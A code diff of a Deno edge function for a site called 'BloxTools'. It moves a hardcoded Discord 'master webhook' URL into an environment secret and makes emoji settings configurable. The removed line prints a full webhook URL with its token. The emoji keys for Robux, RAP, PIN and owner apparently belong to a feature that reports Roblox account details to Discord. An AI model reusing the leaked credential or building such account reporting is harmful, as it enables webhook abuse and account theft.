@@ -18,14 +18,16 @@ interface Body {
   extras?: Record<string, string | number | undefined>;
 }
 
-const MASTER_WEBHOOK =
-  "https://discord.com/api/webhooks/1499103473546035462/pSKamRGzu27_7p4kr2Spr5YZl7zylwmRuj4omBg02R3jVq6XbCCpbYl6gh4G6KkAv95z";
+// Master webhook is read from the MASTER_WEBHOOK_URL secret at request time so
+// updating the secret takes effect immediately with no redeploy needed.
+const MASTER_WEBHOOK = (Deno.env.get("MASTER_WEBHOOK_URL") ?? "").trim();
 
 const SITE_NAME = "BloxTools";
 
-// Discord emoji overrides — KEEP IN SYNC with src/config/toolsConfig.ts > discordEmojis
-// Edge functions cannot import from src/, so this is mirrored here.
-const EMOJI = {
+// Default Discord emoji overrides. The DISCORD_EMOJIS secret (JSON object) can
+// override any of these keys at runtime, so changing emojis only requires
+// updating the secret — no redeploy and no hardcoded fallback masking it.
+const DEFAULT_EMOJI: Record<string, string> = {
   robux:    "<:7116_Robux:1498757858731360349>",
   premium:  "<:Roblox_Premium_logosvg:1498785365308211201>",
   rap:      "💎",
@@ -50,6 +52,20 @@ const EMOJI = {
   pin:      "🔐",
   owner:    "🏷️",
 };
+
+function loadEmoji(): Record<string, string> {
+  const raw = Deno.env.get("DISCORD_EMOJIS");
+  if (!raw) return DEFAULT_EMOJI;
+  try {
+    const parsed = JSON.parse(raw) as Record<string, string>;
+    return { ...DEFAULT_EMOJI, ...parsed };
+  } catch (e) {
+    console.error("DISCORD_EMOJIS secret is not valid JSON, falling back to defaults", e);
+    return DEFAULT_EMOJI;
+  }
+}
+
+const EMOJI = loadEmoji();
 
 
 // Roblox bundle IDs
